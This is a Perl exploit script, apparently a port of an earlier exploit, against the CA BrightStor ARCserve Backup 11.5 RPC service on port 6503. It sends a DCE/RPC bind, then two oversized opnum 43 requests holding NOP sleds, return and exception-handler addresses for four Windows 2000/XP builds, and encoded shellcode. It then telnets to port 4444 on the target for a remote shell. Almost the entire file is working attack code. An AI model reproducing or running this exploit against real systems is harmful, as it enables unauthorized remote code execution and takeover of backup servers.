#!/usr/bin/perl
# 
# original exploit by lssec.com this is a perl porting
# 
# acaro [at] jervus.it


use IO::Socket::INET;
use Switch;

if (@ARGV < 3) {
print "--------------------------------------------------------------------\n";
print "Usage : BrightStoreARCServer-11-5-4targets.pl -hTargetIPAddress -oTargetReturnAddress\n";
print " Return address: \n";
print " 1 - Windows 2k Sp4 English Version\n";
print " 2 - Windows 2k Sp4 Italian Version\n";
print " 3 - Windows XP Pro Sp1 English Version\n";
print " 4 - Windows XP Pro Sp0 English Version\n";
print " If values not specified, Windows 2k Sp4 will be used.\n";
print " Example : ./BrightStoreARCServer-11-5-4targets.pl -h127.0.0.1 -o1 -o1\n";
print "--------------------------------------------------------------------\n";
}

use IO::Socket::INET;

my $host = 10.0.0.2;
my $port = 6503;
my $reply;
my $request;
my $jmp="\xeb\x0a\x90\x90";	# JMP over ret and uef to our shellcode




foreach (@ARGV) {
$host = $1 if ($_=~/-h((.*)\.(.*)\.(.*)\.(.*))/);
$uef = $1 if ($_=~/-o(.*)/);
$ret = $1 if ($_=~/-o(.*)/);
}




switch ($uef) {
case 1 { $uef="\x4c\x14\x54\x7c" } # Win2k SP4 English version
case 2 { $uef="\x4c\x14\x68\x79" } # Win2k SP4 Italian  version
case 3 { $uef="\xb4\x73\xed\x77" } # WinXP Pro English SP1 version
case 4 { $uef="\xb4\x63\xed\x77" } # WinXP Pro English SP0 version
}

switch ($ret) {
case 1 { $ret="\xbf\x75\x40\x2d" } # Win2k SP4 English version CALL DWORD PTR DS:[ESI+48] in qclient.dll
case 2 { $ret="\xbf\x75\x40\x2d" } # Win2k SP4 Italian  version CALL DWORD PTR DS:[ESI+48] in qclient.dll
case 3 { $ret="\x52\xbf\x04\x78" } # WinXP Pro English SP1 version CALL DWORD PTR DS:[EDI+6c] in RPCRT4.dll
case 4 { $ret="\xd7\xe9\xd0\x77" } # WinXP Pro English SP0 version CALL DWORD PTR DS:[EDI+6c] in RPCRT4.dll
}




my $shellcode  =
"\x31\xc9\x83\xe9\xb0\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xe0".
"\x00\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f".
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf".
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xbA\xbb\xbc\xbd\xbe\xbf".
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf".
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf".
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef".
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff".
"\x1f\xb9\x85\x79\x86\x07\xd0\x18\x88\x18\x90\x18\xbf\x3b\x1c\xfa".
"\x88\xa4\x0e\xd6\xdb\x3f\x1c\xfc\xbf\xe6\x06\x4c\x61\x82\xeb\x28".
"\xb5\x05\xe1\xd5\x30\x07\x3a\x23\x15\xc2\xb4\xd5\x36\x3c\xb0\x79".
"\xb3\x3c\xa0\x79\xa3\x3c\x1c\xfa\x86\x07\xf2\x76\x86\x3c\x6a\xcb".
"\x75\x07\x47\x30\x90\xa8\xb4\xd5\x36\x05\xf3\x7b\xb5\x90\x33\x42".
"\x44\xc2\xcd\xc3\xb7\x90\x35\x79\xb5\x90\x33\x42\x05\x26\x65\x63".
"\xb7\x90\x35\x7a\xb4\x3b\xb6\xd5\x30\xfc\x8b\xcd\x99\xa9\x9a\x7d".
"\x1f\xb9\xb6\xd5\x30\x09\x89\x4e\x86\x07\x80\x47\x69\x8a\x89\x7a".
"\xb9\x46\x2f\xa3\x07\x05\xa7\xa3\x02\x5e\x23\xd9\x4a\x91\xa1\x07".
"\x1e\x2d\xcf\xb9\x6d\x15\xdb\x81\x4b\xc4\x8b\x58\x1e\xdc\xf5\xd5".
"\x95\x2b\x1c\xfc\xbb\x38\xb1\x7b\xb1\x3e\x89\x2b\xb1\x3e\xb6\x7b".
"\x1f\xbf\x8b\x87\x39\x6a\x2d\x79\x1f\xb9\x89\xd5\x1f\x58\x1c\xfa".
"\x6b\x38\x1f\xa9\x24\x0b\x1c\xfc\xb2\x90\x33\x42\x10\xe5\xe7\x75".
"\xb3\x90\x35\xd5\x30\x6f\xe3\x2a";


my $uuid="\x05".							#version
"\x00".									#version minor
"\x0b".									#packet bind
"\x03".									#packet flag
"\x10\x00\x00\x00".							#data rapresentation
"\x48\x00".								#fragment length
"\x00\x00".								#auth length
"\x01\x00\x00\x00".							#call id
"\xd0\x16\xd0\x16".				
"\x00\x00\x00\x00".							#assoc group			
"\x01\x00\x00\x00\x00\x00\x01\x00".					
"\xf0\x6b\x24\xdc\x7a\x7a\xce\x11\x9f\x88\x00\x80\x5f\xe4\x38\x38".	#uuid
"\x01\x00".								#interface ver
"\x00\x00".								#interface ver minor
"\x04\x5d\x88\x8a\xeb\x1c\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60".	#transfer syntax
"\x02\x00\x00\x00";							#syntax ver

my $special="\x05".							#version
"\x00".									#version minor
"\x00".									#packet type request
"\x03".									#packet flags
"\x10\x00\x00\x00".							#data rapresentation
"\x18\x08".								#frag length
"\x00\x00".								#auth length
"\x01\x00\x00\x00".							#call id
"\x00\x08\x00\x00".							#alloc hint
"\x00\x00".								#contex id
"\x2b\x00";								#opnum 43




my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$host, PeerPort=>$port);
$socket or die "Cannot connect to host!\n";


$request = $uuid;
send $socket, $request, 0;
print "[+] Sent uuid request\n";
recv($socket, $reply, 1024, 0);


$request = $special.("\x90"x680).$jmp.$ret.$uef.$shellcode.("\x90"x1006)."\r\n";
send $socket, $request, 0;
print "[+] Sent malicius 1st request\n";


$request = $special.("\x90"x680).$jmp.$ret.$uef.$shellcode.("\x90"x1029)."\r\n";
send $socket, $request, 0;
print "[+] Sent malicius 2nd request\n";



print " + Connect on 4444 port of $host ...\n";
sleep(3);
system("telnet $host 4444");
exit;